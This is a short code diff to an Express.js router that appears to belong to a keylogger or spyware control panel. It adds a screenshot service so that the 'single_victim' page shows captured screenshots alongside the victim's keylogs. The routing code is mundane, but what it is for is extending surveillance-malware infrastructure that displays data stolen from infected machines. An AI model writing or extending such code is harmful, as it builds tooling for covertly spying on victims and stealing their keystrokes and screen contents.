@@ -5,6 +5,7 @@ const escapingFunctions = require('../middlewares/escaping')
 const router = express.Router()
 const clientService = require('../../services/clientService')
 const keylogsService = require('../../services/keylogsService')
+const screenshotService = require('../../services/screenshotService')
 
 router.get('/', async (req, res, next) => {
     try {
@@ -21,12 +22,14 @@ router.get('/:uuid', async (req, res, next) => {
     try {
         const single_client = await clientService.findOneByUuid(req.params.uuid)
         const keylogs = await keylogsService.findAllByClientId(single_client.id)
+        const screenshots = await screenshotService.findAllByClientId(single_client.id)
 
         
         res.render('pages/single_victim', 
         {
             single_client: single_client,
-            keylogs: keylogs
+            keylogs: keylogs,
+            screenshots: screenshots
         })
     } catch (e) { next(e) }
 })
